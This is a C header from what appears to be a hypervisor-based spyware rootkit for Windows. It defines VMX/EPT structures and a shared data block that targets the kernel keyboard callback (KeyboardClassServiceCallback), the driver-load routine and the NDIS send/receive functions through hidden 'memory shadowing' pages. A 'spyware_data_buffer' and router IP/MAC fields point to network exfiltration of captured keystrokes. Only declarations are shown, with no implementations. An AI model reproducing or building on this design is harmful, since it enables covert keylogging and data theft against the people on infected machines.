#ifndef __VMM_H
#define __VMM_H
#include <lib/types.h>
#include <vmm/vmcs.h>
#include <vmm/paging.h>

typedef struct __attribute__((__packed__)) {
    eptp_t eptp;
    uint64_t zeros;
} invept_descriptor_t;

extern void vmentry_handler();

extern void JumpToGuest();
extern void CallReal(void (*)(void));
extern void low_functions_start();
extern void low_functions_end();
extern void call_real_end();
extern void __invept(invept_descriptor_t *descriptor, uint64_t type);

#define CPUID_VMXON (1<<5)
#define CR4_VMXE (1 << 13)
#define CR4_OSXSAVE (1 << 18)
#define CR0_NE (1 << 5)

typedef struct {
    uint8_t length;
    byte_t chars[213];
} spyware_data_t;

typedef struct {
    byte_t *MiDriverLoadSucceeded_rw;
    byte_t *MiDriverLoadSucceeded_x;
    byte_t *KeyboardClassServiceCallback_rw;
    byte_t *KeyboardClassServiceCallback_x;
    byte_t *ndisMSendNBLToMiniportInternal_rw;
    byte_t *ndisMSendNBLToMiniportInternal_x;
    byte_t *NdisMIndicateReceiveNetBufferLists_rw;
    byte_t *NdisMIndicateReceiveNetBufferLists_x;
} memory_shadowing_pages_t;

typedef struct {
    word_t int15h_segment;
    word_t int15h_offset;
    dword_t allocation_lock;
    dword_t puts_lock;
    qword_t pml4;
    qword_t ept_pml4;
    msr_bitmaps_t *msr_bitmaps;
    qword_t ntoskrnl;
    qword_t kbdclass;
    qword_t ndis;
    qword_t PsLoadedModuleList;
    struct {
        qword_t MiDriverLoadSucceeded;
        qword_t KeyboardClassServiceCallback;
        qword_t NdisMIndicateReceiveNetBufferLists;
        qword_t ndisMSendNBLToMiniportInternal;
    } functions;
    dword_t router_ip;
    byte_t router_mac[6];
    BOOL mac_ready;
    BOOL send_pending;
    BOOL send_requests;
    dword_t spyware_data_lock;
    spyware_data_t spyware_data_buffer;
    memory_shadowing_pages_t memory_shadowing_pages;
} shared_cores_data_t;

#define MAX_BUFFER_LENGTH 213

typedef struct __attribute__((__packed__)) {
    union {
        uint32_t revision_id;
        struct __attribute__((__packed__)){
            uint32_t : 31;
            uint32_t shadow_vmcs_indicator : 1;
        };
    };
    uint32_t vmx_abort;
    // vmcs data
} vmcs_t;

typedef struct __attribute__((__packed__)) {
    qword_t rax;
    qword_t rbx;
    qword_t rcx;
    qword_t rdx;
    qword_t rdi;
    qword_t rsi;
    qword_t rbp;
    qword_t r8;
    qword_t r9;
    qword_t r10;
    qword_t r11;
    qword_t r12;
    qword_t r13;
    qword_t r14;
    qword_t r15;
} guest_registers_t;

typedef struct {
    guest_registers_t *registers;
    BASIC_EXIT_REASON exit_reason;
    exit_qualification_t exit_qual;
    qword_t guest_linear_address;
    qword_t guest_physical_address;
    exit_interruption_info_t interruption_info;
    uint32_t interruption_errorcode;
    exit_interruption_info_t idt_info;
    uint32_t idt_errorcode;
    uint32_t instr_length;
    instruction_info_t instr_info;
    uint32_t vmx_error;
} vmexit_data_t;

extern void prepare_vmm(void);
extern shared_cores_data_t shared_cores_data;

#endif
